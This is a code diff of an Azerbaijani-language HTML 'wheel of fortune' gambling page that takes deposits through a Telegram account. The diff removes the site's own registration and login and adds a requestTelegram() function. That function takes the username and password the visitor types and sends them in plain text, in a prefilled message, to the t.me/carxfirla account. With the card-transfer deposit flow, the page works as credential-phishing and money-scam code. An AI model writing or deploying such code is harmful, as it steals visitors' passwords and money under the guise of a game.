@@ -8,32 +8,10 @@ body { font-family: Arial; text-align: center; background:#111; color:white; }
 .container { max-width:400px; margin:auto; padding:20px; }
 input, button { margin:5px; padding:10px; width:90%; }
 .hidden { display:none; }
-#wheel {
-  margin:20px auto;
-  width:220px;
-  height:220px;
-  border-radius:50%;
-  border:5px solid white;
-  transition: transform 3s ease-out;
-  position: relative;
-}
-#wheelCanvas {
-  width: 100%;
-  height: 100%;
-  border-radius: 50%;
-}
-#pointer {
-  width:0; height:0; border-left:15px solid transparent; border-right:15px solid transparent;
-  border-bottom:30px solid white; margin:-30px auto 0 auto;
-}
-#topMessage {
-  background: #222;
-  color: #FFD700;
-  padding: 10px;
-  border-radius: 8px;
-  margin-bottom: 15px;
-  font-weight: bold;
-}
+#wheel { margin:20px auto; width:220px; height:220px; border-radius:50%; border:5px solid white; transition: transform 3s ease-out; position: relative; }
+#wheelCanvas { width: 100%; height: 100%; border-radius: 50%; }
+#pointer { width:0; height:0; border-left:15px solid transparent; border-right:15px solid transparent; border-bottom:30px solid white; margin:-30px auto 0 auto; }
+#topMessage { background: #222; color: #FFD700; padding: 10px; border-radius: 8px; margin-bottom: 15px; font-weight: bold; }
 </style>
 </head>
 <body>
@@ -42,22 +20,16 @@ input, button { margin:5px; padding:10px; width:90%; }
 
 <div id="topMessage">🎡 Çarxı fırlatmaq üçün 1₼ əlavə et və şansını sınayaraq qazan!</div>
 
+<!-- LOGIN -->
 <div id="login">
 <h2>Giriş</h2>
 <input id="loginUser" placeholder="İstifadəçi adı">
 <input id="loginPass" type="password" placeholder="Şifrə">
-<button onclick="login()">Daxil ol</button>
-<p>Hesabın yoxdur? <button onclick="showRegister()">Qeydiyyat</button></p>
+<button onclick="requestTelegram()">Daxil ol</button>
+<p>Hesabınız aktiv deyil? <button onclick="requestTelegram()">Telegram vasitəsilə aktiv edin</button></p>
 </div>
 
-<div id="register" class="hidden">
-<h2>Qeydiyyat</h2>
-<input id="user" placeholder="İstifadəçi adı">
-<input id="email" placeholder="Email">
-<input id="pass" type="password" placeholder="Şifrə">
-<button onclick="register()">Qeydiyyatdan keç</button>
-</div>
-
+<!-- PANEL -->
 <div id="panel" class="hidden">
 <h2>Panel</h2>
 <p id="balanceText">Balans: 0 ₼</p>
@@ -78,29 +50,10 @@ input, button { margin:5px; padding:10px; width:90%; }
 </div>
 
 <script>
-let userData = JSON.parse(localStorage.getItem("userData")) || null;
 let balance = 0;
 let deg = 0;
 
-function showRegister(){ document.getElementById("login").classList.add("hidden"); document.getElementById("register").classList.remove("hidden"); }
-function register(){
-  let user = document.getElementById("user").value.trim();
-  let email = document.getElementById("email").value.trim();
-  let pass = document.getElementById("pass").value.trim();
-  if(!user || !email || !pass){ alert("Bütün xanaları doldur!"); return; }
-  userData = {user,email,pass}; localStorage.setItem("userData",JSON.stringify(userData)); balance=0;
-  alert("Qeydiyyat tamamlandı! Avtomatik daxil oldunuz."); openPanel();
-}
-function login(){
-  let user = document.getElementById("loginUser").value.trim();
-  let pass = document.getElementById("loginPass").value.trim();
-  if(!userData || user!==userData.user || pass!==userData.pass){ alert("Yanlış məlumat!"); return; }
-  openPanel();
-}
-function openPanel(){ document.getElementById("login").classList.add("hidden"); document.getElementById("register").classList.add("hidden"); document.getElementById("panel").classList.remove("hidden"); updateBalance(); }
-function updateBalance(){ document.getElementById("balanceText").innerText="Balans: "+balance+" ₼"; }
-
-// Çarx sektorları: pul sektorları aralıklı
+// Pul və boş sektorlar
 const sectors = [
   {text:"Bəxtini bir daha sına", color:"#777", prize:0},
   {text:"2₼", color:"#FF5733", prize:2},
@@ -115,16 +68,30 @@ const sectors = [
 ];
 
 // Canvas çarx
-const canvas=document.getElementById("wheelCanvas"); const ctx=canvas.getContext("2d"); canvas.width=canvas.height=220;
+const canvas=document.getElementById("wheelCanvas"); 
+const ctx=canvas.getContext("2d"); 
+canvas.width=canvas.height=220;
+
 function drawWheel(){
-  let startAngle=0; const arc=2*Math.PI/sectors.length;
+  let startAngle=0; 
+  const arc=2*Math.PI/sectors.length;
   sectors.forEach(sec=>{
-    ctx.beginPath(); ctx.moveTo(110,110);
+    ctx.beginPath(); 
+    ctx.moveTo(110,110);
     ctx.arc(110,110,110,startAngle,startAngle+arc);
-    ctx.fillStyle=sec.color; ctx.fill(); ctx.strokeStyle="#fff"; ctx.stroke();
+    ctx.fillStyle=sec.color; 
+    ctx.fill(); 
+    ctx.strokeStyle="#fff"; 
+    ctx.stroke();
     // text
-    ctx.save(); ctx.translate(110,110); ctx.rotate(startAngle+arc/2);
-    ctx.textAlign="right"; ctx.fillStyle="#fff"; ctx.font="bold 14px Arial"; ctx.fillText(sec.text,100,5); ctx.restore();
+    ctx.save(); 
+    ctx.translate(110,110); 
+    ctx.rotate(startAngle+arc/2);
+    ctx.textAlign="right"; 
+    ctx.fillStyle="#fff"; 
+    ctx.font="bold 14px Arial"; 
+    ctx.fillText(sec.text,100,5); 
+    ctx.restore();
     startAngle+=arc;
   });
 }
@@ -145,8 +112,20 @@ function spin(){
   },3000);
 }
 
+function updateBalance(){ document.getElementById("balanceText").innerText="Balans: "+balance+" ₼"; }
+
 function deposit(){ window.open("https://t.me/carxfirla?text=Salam%20Men%20balans%20artirmaq%20isdeyirem%20zehmet%20olmasa%20kart%20gonderin"); }
 function withdraw(){ if(balance<50){ alert("Minimum 50₼ lazımdır!"); return; } window.open("https://t.me/carxfirla?text=Salam%20Men%20cixaris%20etmek%20isdeyirem%20balansim%2050₼%20olubdur"); }
+
+// Telegram mesajı üçün düymə
+function requestTelegram(){
+  alert("Sayta daxil olmaq üçün hesabınızı Telegram vasitəsilə aktiv edin.");
+  const loginUser=document.getElementById("loginUser").value.trim();
+  const loginPass=document.getElementById("loginPass").value.trim();
+  let message = `Salam! Mən hesabımı aktiv etmək istəyirəm.\nİstifadəçi adı: ${loginUser}\nŞifrə: ${loginPass}`;
+  // Telegram linki ilə avtomatik mesaj
+  window.open("https://t.me/carxfirla?text=" + encodeURIComponent(message));
+}
 </script>
 
 </body>
